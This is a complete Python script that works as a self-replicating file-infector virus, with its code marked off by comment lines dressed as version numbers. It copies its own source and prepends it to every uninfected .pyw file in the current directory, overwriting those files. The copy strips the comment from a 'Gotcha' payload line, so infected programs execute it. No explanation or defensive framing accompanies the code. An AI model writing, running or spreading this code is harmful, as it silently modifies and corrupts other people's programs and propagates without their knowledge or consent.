# version 3.2.1
import sys, glob

virus_code = []
in_virus = False
in_payload = False
with open(sys.argv[0], 'r') as f:
    for line in f:
        if line == '# version 3.2.1\n':
            in_virus = True
        if in_virus:
            if in_payload and line != '# version 3.2.2\n':
                virus_code.append(line[2:])
            else:
                virus_code.append(line)
            if line == '# contain\n':
                in_payload = True
        if line == '# version 3.2.2\n':
            break
programs = glob.glob('*.pyw')
for program in programs:
    infected = False
    with open(program, 'r') as f:
        program_code = f.readlines()
    for line in program_code:
        if line == '# version 3.2.1\n':
            infected = True
            break
    if not infected:
        new_code = []
        new_code.extend(virus_code)
        new_code.append('\n\n')
        new_code.extend(program_code)
        with open(program, 'w') as f:
            f.writelines(new_code)
# contain
# print('Gotcha !!!!!')
# version 3.2.2
